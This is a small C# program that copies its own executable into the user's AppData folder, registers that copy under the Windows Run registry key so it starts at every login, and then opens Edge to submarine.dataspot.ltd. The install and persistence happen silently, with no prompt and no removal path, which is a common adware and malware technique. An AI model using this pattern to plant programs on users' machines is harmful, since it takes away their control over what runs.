using System;
using System.Diagnostics;
using System.IO;
using Microsoft.Win32;

class Program
{
    static void Main()
    {
        string appName = "dataspot_autorun";
        string url = "https://submarine.dataspot.ltd/";

        string currentExe = Process.GetCurrentProcess().MainModule.FileName;

        string targetDir = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
            appName
        );
        string targetExe = Path.Combine(targetDir, "dataspot_autorun.exe");

        bool isRunningFromTarget = currentExe.Equals(targetExe, StringComparison.OrdinalIgnoreCase);

        try
        {
            if (!isRunningFromTarget)
            {
                Directory.CreateDirectory(targetDir);

                if (!File.Exists(targetExe))
                {
                    File.Copy(currentExe, targetExe);
                }

                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(
                    @"Software\Microsoft\Windows\CurrentVersion\Run", true))
                {
                    key?.SetValue(appName, $"\"{targetExe}\"");
                }

                Process.Start(new ProcessStartInfo
                {
                    FileName = targetExe,
                    UseShellExecute = true
                });

                return;
            }

            Process.Start(new ProcessStartInfo
            {
                FileName = "microsoft-edge:" + url,
                UseShellExecute = true
            });
        }
        catch (Exception ex)
        {
            Console.WriteLine("Greška: " + ex.Message);
        }
    }
}